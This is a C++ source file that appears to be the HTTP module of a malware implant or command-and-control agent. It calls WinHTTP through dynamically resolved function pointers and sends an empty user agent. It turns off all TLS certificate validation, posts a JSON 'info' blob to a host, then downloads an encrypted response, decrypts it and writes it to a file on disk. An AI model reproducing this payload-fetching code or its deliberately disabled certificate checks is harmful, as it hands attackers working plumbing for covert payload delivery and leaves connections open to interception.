#include "core/system.hpp"

namespace System::Http
{
	WinHttpHandlers InitRequest(
		Procs::PPROCS pProcs,
		LPCWSTR lpHost,
		INTERNET_PORT nPort
	) {
		HINTERNET hSession = NULL;
		HINTERNET hConnect = NULL;

		hSession = pProcs->lpWinHttpOpen(
			L"",
			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
			WINHTTP_NO_PROXY_NAME,
			WINHTTP_NO_PROXY_BYPASS,
			0
		);
		if (!hSession) {
			return {hSession, hConnect};
		}

		hConnect = pProcs->lpWinHttpConnect(hSession, lpHost, nPort, 0);
		return {hSession, hConnect};
	}

	WinHttpResponse SendRequest(
		Procs::PPROCS pProcs,
		HINTERNET hConnect,
		LPCWSTR lpHost,
		INTERNET_PORT nPort,
		LPCWSTR lpPath,
		LPCWSTR lpMethod,
		LPCWSTR lpHeaders,
		LPVOID lpData,
		DWORD dwDataLength
	) {
		BOOL bResult = FALSE;
		HINTERNET hRequest = NULL;
		DWORD dwSecFlags = 0;
		DWORD dwDataWrite = 0;
		DWORD dwStatusCode = 0;
		DWORD dwStatusCodeSize = sizeof(dwStatusCode);

		hRequest = pProcs->lpWinHttpOpenRequest(
			hConnect,
			lpMethod,
			lpPath,
			NULL,
			WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE
		);
		if (!hRequest) {
			return {FALSE, hRequest, 0};
		}

		dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
					SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
					SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

		bResult = pProcs->lpWinHttpSetOption(
			hRequest,
			WINHTTP_OPTION_SECURITY_FLAGS,
			&dwSecFlags,
			sizeof(DWORD)
		);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		if (!lpHeaders)
		{
			lpHeaders = WINHTTP_NO_ADDITIONAL_HEADERS;
		}

		bResult = pProcs->lpWinHttpSendRequest(
			hRequest,
			lpHeaders,
			lpHeaders ? -1 : 0,
			WINHTTP_NO_REQUEST_DATA,
			0,
			dwDataLength,
			0
		);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		if (lpData) {
			bResult = pProcs->lpWinHttpWriteData(
				hRequest,
				lpData,
				dwDataLength,
				&dwDataWrite
			);
		}

		bResult = pProcs->lpWinHttpReceiveResponse(hRequest, NULL);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		bResult = pProcs->lpWinHttpQueryHeaders(
			hRequest, 
			WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
			WINHTTP_HEADER_NAME_BY_INDEX, 
			&dwStatusCode,
			&dwStatusCodeSize,
			WINHTTP_NO_HEADER_INDEX
		);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		return {bResult, hRequest, dwStatusCode};
	}

	// Read response as bytes.
	std::vector<BYTE> ReadResponseBytes(Procs::PPROCS pProcs, HINTERNET hRequest) {
		std::vector<BYTE> bytes;

		DWORD dwSize = 0;
		DWORD dwDownloaded = 0;
		do
		{
			dwSize = 0;
			if (pProcs->lpWinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				BYTE* tempBuffer = new BYTE[dwSize+1];
				if (!tempBuffer)
				{
					dwSize = 0;
				}
				else
				{
					ZeroMemory(tempBuffer, dwSize+1);
					if (pProcs->lpWinHttpReadData(hRequest, (LPVOID)tempBuffer, dwSize, &dwDownloaded))
					{
						// Add to buffer;
						for (size_t i = 0; i < dwDownloaded; ++i)
						{
							bytes.push_back(tempBuffer[i]);
						}
					}

					delete [] tempBuffer;
				}
			}
		} while (dwSize > 0);
		
		return bytes;
	}

	// Wrapper for send&read&write response data
	BOOL DownloadFile(
		Procs::PPROCS pProcs,
		HINTERNET hConnect,
		LPCWSTR lpHost,
		INTERNET_PORT nPort,
		LPCWSTR lpPath,
		LPCWSTR lpHeaders,
		const std::wstring& wInfoJSON,
		const std::wstring& wDest
	) {
		std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);

		WinHttpResponse resp = SendRequest(
			pProcs,
			hConnect,
			lpHost,
			nPort,
			lpPath,
			L"POST",
			lpHeaders,
			(LPVOID)sInfoJSON.c_str(),
			(DWORD)strlen(sInfoJSON.c_str())
		);
		if (!resp.bResult || resp.dwStatusCode != 200)
		{
			return FALSE;
		}

		// std::ofstream outFile(sFile, std::ios::binary);
		HANDLE hFile = CreateFileW(
			wDest.c_str(),
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}

		// Read file
		std::vector<BYTE> bytes = ReadResponseBytes(pProcs, resp.hRequest);
		if (bytes.size() == 0)
		{
			return FALSE;
		}

		// Decrypt data
		std::vector<BYTE> decBytes = Crypt::DecryptData(Utils::Convert::VecByteToString(bytes));
		
		// Write data to file
		DWORD dwWritten;
		if (!WriteFile(hFile, decBytes.data(), decBytes.size(), &dwWritten, NULL))
		{
			CloseHandle(hFile);
			return FALSE;
		}

		// outFile.close();
		CloseHandle(hFile);

		return TRUE;
	}

	VOID WinHttpCloseHandles(
		Procs::PPROCS pProcs,
		HINTERNET hSession,
		HINTERNET hConnect,
		HINTERNET hRequest
	) {
		if (hRequest) pProcs->lpWinHttpCloseHandle(hRequest);
		if (hConnect) pProcs->lpWinHttpCloseHandle(hConnect);
		if (hSession) pProcs->lpWinHttpCloseHandle(hSession);
	}
}

